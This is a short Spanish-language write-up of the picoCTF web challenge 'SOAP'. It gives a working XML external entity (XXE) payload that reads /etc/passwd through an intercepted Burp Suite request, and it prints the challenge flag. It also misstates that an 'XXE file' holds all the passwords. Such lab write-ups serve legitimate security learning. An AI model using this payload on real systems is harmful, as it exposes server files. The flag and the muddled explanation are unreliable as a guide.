### SOAP
### Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:62378/)
### Solucion
- Inspeccionando la pagina vemos que nos da el id cada que se presiona un boton.
- Con burpsuite podemos interceptar los request.
- El archivo XXE es donde se encuentran todas las contraseñas.
- con esta linea se soluciona inyectandoa en el repeater de burpsuite
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>
```
picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
### Notas
- XML es un formato basado en etiquetas que sirve para organizar, almacenar y enviar datos estructurados de manera jerárquica y legible.
### Referencias